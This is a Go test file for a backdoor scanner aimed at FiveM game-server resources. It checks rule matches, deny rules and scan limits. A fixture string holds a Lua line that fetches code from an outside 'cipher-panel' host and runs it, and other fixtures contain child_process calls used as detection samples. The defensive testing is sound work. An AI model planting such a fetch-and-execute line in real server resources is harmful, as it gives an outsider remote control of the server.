package backdoor

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/xena-studios/raptor/internal/eggs"
	"github.com/xena-studios/raptor/internal/wings/files"
)

func server(t *testing.T, tree map[string]string, deny []string) (*files.FS, string) {
	t.Helper()
	dir := t.TempDir()
	for name, body := range tree {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	f, err := files.Open(dir, os.Getuid(), os.Getgid(), files.Compile(deny))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = f.Close() })
	return f, dir
}

const bad = `PerformHttpRequest('https://cipher-panel.me/_i/i?to=x', function(e, d) assert(load(d))() end)`

func TestScanDirs(t *testing.T) {
	f, dir := server(t, map[string]string{
		"resources/[local]/evil/server.lua":             bad,
		"resources/[local]/evil/fxmanifest.lua":         "fx_version 'cerulean'",
		"resources/[local]/evil/README.md":              bad,
		"resources/ui/node_modules/x/index.js":          `require("child_process")`,
		"resources/.git/hooks/a.js":                     `require("child_process")`,
		"resources/secret/server.lua":                   bad,
		"txData/default/resources/thing/client.js":      `const { exec } = require('child_process');`,
		"alpine/opt/cfx-server/citizen/system/init.lua": bad,
	}, []string{"resources/secret"})
	if err := os.Symlink("/etc", filepath.Join(dir, "resources", "etc")); err != nil {
		t.Fatal(err)
	}
	r, err := ScanDirs(context.Background(), f, "fivem", []string{"resources", "txData", "missing"}, DefaultLimits)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(r.Dirs, []string{"resources", "txData"}) || r.Stopped != "" || r.Files != 3 {
		t.Fatalf("%+v", r)
	}
	var got []string
	for _, fd := range r.Findings {
		got = append(got, fd.File+":"+fd.Rule)
	}
	want := []string{"resources/[local]/evil/server.lua:backdoor-panel", "txData/default/resources/thing/client.js:child-process"}
	if !slices.Equal(got, want) {
		t.Fatalf("got %v, want %v", got, want)
	}
}

func TestScanLimits(t *testing.T) {
	tree := map[string]string{}
	for i := range 5 {
		tree["resources/r"+string(rune('a'+i))+"/s.lua"] = bad + "\n" + bad
	}
	tree["resources/big/s.lua"] = strings.Repeat("-- x\n", 1000)
	f, _ := server(t, tree, nil)
	lim := DefaultLimits
	lim.FileSize = 1000
	r, err := ScanDirs(context.Background(), f, "fivem", []string{"resources"}, lim)
	if err != nil || r.Skipped != 1 || r.Files != 5 || r.Stopped != "" || len(r.Findings) != 10 {
		t.Fatalf("size: %+v %v", r, err)
	}
	for stop, l := range map[string]Limits{
		"files":    {Files: 2, FileSize: 1 << 20, Bytes: 1 << 30, Time: time.Minute, Findings: 100},
		"bytes":    {Files: 100, FileSize: 1 << 20, Bytes: 10, Time: time.Minute, Findings: 100},
		"findings": {Files: 100, FileSize: 1 << 20, Bytes: 1 << 30, Time: time.Minute, Findings: 3},
		"time":     {Files: 100, FileSize: 1 << 20, Bytes: 1 << 30, Time: time.Nanosecond, Findings: 100},
	} {
		r, err := ScanDirs(context.Background(), f, "fivem", []string{"resources"}, l)
		if err != nil || r.Stopped != stop {
			t.Errorf("%s: %+v %v", stop, r, err)
		}
		if len(r.Findings) > l.Findings || r.Files > l.Files {
			t.Errorf("%s: over its limit: %+v", stop, r)
		}
	}
	// A cancelled request is an error, not a timed-out scan.
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := ScanDirs(ctx, f, "fivem", []string{"resources"}, DefaultLimits); err == nil {
		t.Error("cancelled scan succeeded")
	}
	if _, err := ScanDirs(context.Background(), f, "nope", []string{"resources"}, DefaultLimits); err == nil {
		t.Error("unknown rules")
	}
}

// Every rule set an egg can name has rules here.
func TestRuleSetsMatchEggs(t *testing.T) {
	if !slices.Equal(eggs.ScanRules, RuleSets) {
		t.Fatalf("eggs.ScanRules %v, backdoor.RuleSets %v", eggs.ScanRules, RuleSets)
	}
}
